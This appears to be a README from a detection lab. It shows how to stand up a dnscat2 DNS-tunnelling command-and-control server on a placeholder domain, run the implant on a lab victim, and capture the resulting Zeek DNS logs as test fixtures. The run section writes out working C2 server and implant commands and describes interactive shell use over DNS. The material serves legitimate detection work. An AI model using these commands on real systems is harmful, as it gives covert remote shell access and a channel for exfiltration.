# Attack reproduction — dnscat2

Stand up a dnscat2 server on an attacker-controlled domain, run the implant
on a victim, and let it beacon. This generates the Zeek `dns.log` patterns
the detection in `../detection/` is built to catch.

## Prereqs

You need a domain whose authoritative NS you control. For lab-only use, you
can fake this with a local DNS responder — see `local_lab.md` (TODO, v0.2)
for the no-domain version. The cleanest setup is:

1. Register/own a throwaway domain (e.g. `lab.example.test`)
2. Delegate `c2.lab.example.test` to a host you control
3. Run the dnscat2 server on that host

## Run (high level)

```bash
# On the C2 server (attacker)
git clone https://github.com/iagox86/dnscat2 && cd dnscat2/server
gem install bundler && bundle install
ruby ./dnscat2.rb c2.lab.example.test --secret=labsecret

# On the victim (in the lab subnet that Zeek is sniffing)
# Build the client per dnscat2 README, then:
./dnscat --secret=labsecret c2.lab.example.test

# Send a few interactive commands from the C2 console — `shell`, `ls`, etc.
# Zeek dns.log on the sensor will fill with dnscat2-shaped queries.
```

## Capture telemetry into a fixture

```bash
# After 5–10 minutes of beaconing:
docker exec detlab-zeek cat /usr/local/zeek/logs/current/dns.log \
  | grep "c2.lab.example.test" \
  > /tmp/dnscat2_capture.log

# Trim to a representative slice and copy into the case fixtures:
head -200 /tmp/dnscat2_capture.log > tests/positive_dns.log
```

## Safety / scope

- Lab use only. Don't run dnscat2 on networks you don't own.
- The ruby server is opensource and well-known; running it is no more
  malicious than running netcat. The risk is your *target*, not the tool.
- The synthetic `tests/positive_dns.log` shipped in this repo is generated
  by `scripts/generate_fixtures.py` so the test suite passes without
  needing the lab — replace it with a real capture once you have one.
